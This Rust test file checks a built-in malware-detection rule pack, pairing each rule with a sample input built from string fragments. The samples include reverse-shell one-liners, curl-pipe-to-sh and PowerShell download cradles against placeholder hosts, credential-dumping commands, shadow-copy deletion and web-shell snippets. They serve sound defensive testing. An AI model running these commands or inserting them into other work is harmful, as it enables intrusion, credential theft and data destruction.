use std::collections::BTreeSet;

use super::{BUILTIN_RULES, scan_source, validate_source};

/// One input per built-in rule that the rule must match. The inputs are
/// joined from fragments at run time so that the test binary and the source
/// tree never hold the complete strings that endpoint scanners flag.
fn samples() -> Vec<(&'static str, Vec<u8>)> {
    let text = |parts: &[&str]| parts.concat().into_bytes();
    let mut upx = b"MZ".to_vec();
    upx.extend_from_slice(&[0; 62]);
    upx.extend_from_slice(b"UPX0\0UPX1\0");
    upx.extend_from_slice(b"UPX!");
    vec![
        (
            "builtin.powershell.encoded-command",
            text(&["power", "shell -e", "nc SQBFAFgAIAAoAE4AZQB3AC0A"]),
        ),
        (
            "builtin.powershell.download-cradle",
            text(&[
                "IE",
                "X (New-Object Net.Web",
                "Client).Download",
                "String('x')",
            ]),
        ),
        (
            "builtin.powershell.webclient-download",
            text(&["$c.Download", "File('http://x.example/a', 'a')"]),
        ),
        (
            "builtin.powershell.hidden-window",
            text(&["power", "shell.exe -nop -w", " hidden -c x"]),
        ),
        (
            "builtin.powershell.execution-policy-bypass",
            text(&["-ep", " bypass -file a.ps1"]),
        ),
        (
            "builtin.powershell.amsi-bypass",
            text(&["amsi", "InitFailed"]),
        ),
        (
            "builtin.lolbin.certutil-download",
            text(&["cert", "util -url", "cache -f http://x.example/a"]),
        ),
        (
            "builtin.lolbin.certutil-decode",
            text(&["cert", "util -de", "code a.b64 a.exe"]),
        ),
        (
            "builtin.lolbin.mshta-inline",
            text(&["msh", "ta \"java", "script:close()\""]),
        ),
        (
            "builtin.lolbin.regsvr32-remote-scriptlet",
            text(&[
                "regsvr",
                "32 /s /n /u /i:",
                "http://x.example/a.sct scrobj.dll",
            ]),
        ),
        (
            "builtin.lolbin.rundll32-script",
            text(&["run", "dll32.exe java", "script:\"x\""]),
        ),
        (
            "builtin.lolbin.bitsadmin-transfer",
            text(&["bits", "admin /trans", "fer job http://x.example/a C:\\a"]),
        ),
        (
            "builtin.persistence.run-key",
            text(&[
                "HKCU\\Software\\Microsoft\\Windows\\Current",
                "Version\\Run",
            ]),
        ),
        (
            "builtin.persistence.scheduled-task",
            text(&["sch", "tasks /cre", "ate /tn x /tr a.exe"]),
        ),
        (
            "builtin.impact.shadow-copy-deletion",
            text(&["vss", "admin delete sha", "dows /all"]),
        ),
        (
            "builtin.impact.recovery-disabled",
            text(&["bcd", "edit /set {default} recovery", "enabled No"]),
        ),
        (
            "builtin.impact.ransom-note-phrase",
            text(&["All your files have been ", "encrypted"]),
        ),
        (
            "builtin.evasion.event-log-clear",
            text(&["wevt", "util cl", " Security"]),
        ),
        (
            "builtin.evasion.defender-tamper",
            text(&["Set-Mp", "Preference -Disable", "RealtimeMonitoring $true"]),
        ),
        (
            "builtin.credential.mimikatz-commands",
            text(&["sekur", "lsa::logon", "passwords"]),
        ),
        (
            "builtin.credential.lsass-minidump",
            text(&["comsvcs", ".dll, Mini", "Dump 624 l.dmp full"]),
        ),
        (
            "builtin.script.vba-autoexec-shell",
            text(&["Sub Auto", "Open()\n  Sh", "ell(\"x\")\nEnd Sub"]),
        ),
        (
            "builtin.script.wscript-shell",
            text(&["CreateObject(\"WScript", ".Shell\")"]),
        ),
        (
            "builtin.script.jscript-activex",
            text(&["new ActiveX", "Object(\"ADODB", ".Stream\")"]),
        ),
        (
            "builtin.webshell.php-eval-request",
            text(&["<?php ev", "al($_PO", "ST['x']); ?>"]),
        ),
        (
            "builtin.webshell.jsp-runtime-exec",
            text(&[
                "Runtime.getRuntime().ex",
                "ec(request.get",
                "Parameter(\"c\"))",
            ]),
        ),
        (
            "builtin.webshell.aspx-process-request",
            text(&["Process.Start(\"x\", Req", "uest[\"c\"])"]),
        ),
        (
            "builtin.unix.dev-tcp-reverse-shell",
            text(&["bash -i >& /dev/", "tcp/192.0.2.1/4444 0>&1"]),
        ),
        (
            "builtin.unix.netcat-exec",
            text(&["nc 192.0.2.1 4444 -", "e /bin/sh"]),
        ),
        (
            "builtin.unix.download-pipe-shell",
            text(&["curl -fsSL https://x.example/i", " | sh"]),
        ),
        (
            "builtin.c2.discord-webhook",
            text(&["https://discord.com/api/web", "hooks/123456789/token"]),
        ),
        (
            "builtin.c2.telegram-bot-api",
            text(&[
                "https://api.telegram.org/bot",
                "123456:",
                "AAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAA",
            ]),
        ),
        (
            "builtin.c2.paste-site-raw",
            text(&["https://pastebin.com/", "raw/abc123"]),
        ),
        (
            "builtin.c2.tor-onion-v3",
            text(&[&"a".repeat(56), ".onion"]),
        ),
        (
            "builtin.lolbin.wmic-process-create",
            text(&["wm", "ic /node:host process call cr", "eate cmd.exe"]),
        ),
        (
            "builtin.lolbin.msiexec-remote",
            text(&["msi", "exec /q /i http://x.example/a.msi"]),
        ),
        (
            "builtin.lolbin.cmstp-inf",
            text(&["cm", "stp.exe /s /ns a.inf"]),
        ),
        (
            "builtin.credential.registry-hive-save",
            text(&["re", "g save HKLM\\SA", "M sam.save"]),
        ),
        (
            "builtin.credential.ntds-dit",
            text(&["C:\\Windows\\NT", "DS\\nt", "ds.dit"]),
        ),
        (
            "builtin.credential.browser-login-data",
            text(&[
                "C:\\Users\\a\\AppData\\Local\\Google\\Chrome\\User Data",
                "\\Default\\Login",
                " Data",
            ]),
        ),
        (
            "builtin.persistence.local-admin-add",
            text(&["net loc", "algroup administrators bob /a", "dd"]),
        ),
        (
            "builtin.persistence.new-service",
            text(&["sc cre", "ate svc binPath= C:\\a.exe start= auto"]),
        ),
        (
            "builtin.evasion.firewall-disable",
            text(&["net", "sh advfirewall set allprofiles state off"]),
        ),
        (
            "builtin.evasion.uac-disable",
            text(&[
                "reg add HKLM\\SOFTWARE\\Microsoft\\Windows\\CurrentVersion",
                "\\Policies\\System /v Enable",
                "LUA /t REG_DWORD /d 0",
            ]),
        ),
        (
            "builtin.script.office-dde-command",
            text(&["DDE", "AUTO c:\\windows\\system32\\cm", "d.exe /k x"]),
        ),
        (
            "builtin.unix.cron-append",
            text(&["(cron", "tab -l; echo '* * * * * /tmp/x') | cron", "tab -"]),
        ),
        (
            "builtin.unix.ssh-authorized-keys-append",
            text(&["echo ssh-ed25519 AAAA >> ~/.ssh/", "authorized_keys"]),
        ),
        (
            "builtin.unix.ld-preload-file",
            text(&["echo /tmp/x.so > /etc/ld.so", ".preload"]),
        ),
        (
            "builtin.unix.history-tamper",
            text(&["unset HIST", "FILE; history -c"]),
        ),
        (
            "builtin.cloud.aws-metadata-credentials",
            text(&[
                "curl http://169.254.169.254/latest/meta-data/",
                "iam/security-credentials/role",
            ]),
        ),
        ("builtin.binary.upx-packed", upx),
    ]
}

#[test]
fn builtin_pack_compiles_with_complete_metadata() {
    let report = validate_source(BUILTIN_RULES).expect("built-in rules compile");
    assert!(report.rule_count >= 30);
    for rule in &report.rules {
        assert!(rule.id.starts_with("builtin."), "{}", rule.id);
        assert!(!rule.description.is_empty(), "{}", rule.id);
        assert!(rule.category.is_some(), "{} has no category", rule.id);
        assert!(rule.confidence.is_some(), "{} has no confidence", rule.id);
        assert!(!rule.attack.is_empty(), "{} has no ATT&CK ID", rule.id);
    }
}

#[test]
fn every_builtin_rule_has_a_matching_sample() {
    let samples = samples();
    let sampled: BTreeSet<_> = samples.iter().map(|(id, _)| *id).collect();
    let defined: BTreeSet<_> = validate_source(BUILTIN_RULES)
        .unwrap()
        .rules
        .into_iter()
        .map(|rule| rule.id)
        .collect();
    let defined: BTreeSet<_> = defined.iter().map(String::as_str).collect();
    assert_eq!(sampled, defined, "every rule needs exactly one sample");

    for (id, input) in &samples {
        let report = scan_source(BUILTIN_RULES, input).unwrap();
        assert!(
            report.matches.iter().any(|matched| matched.id == *id),
            "{id} did not match its sample"
        );
    }
}

#[test]
fn builtin_pack_stays_quiet_on_ordinary_text() {
    let ordinary = [
        "Run schtasks /query to list tasks.",
        "See https://example.com/docs and https://pastebin.com/about",
        "PowerShell -Command Get-ChildItem",
        "Sub Main()\n  MsgBox \"hello\"\nEnd Sub",
        "Your files have been saved.",
        "certutil -hashfile a.exe SHA256",
        "net localgroup administrators",
        "sc query spooler",
        "msiexec /i C:\\setup\\app.msi",
        "netsh advfirewall show allprofiles",
        "crontab -l",
        "wmic os get caption",
        "CmdletsToExport = 'Get-EventLog', 'Clear-EventLog', 'Write-EventLog'",
    ];
    for text in ordinary {
        let report = scan_source(BUILTIN_RULES, text.as_bytes()).unwrap();
        assert_eq!(report.matched_rules, 0, "{text}: {:?}", report.matches);
    }
}
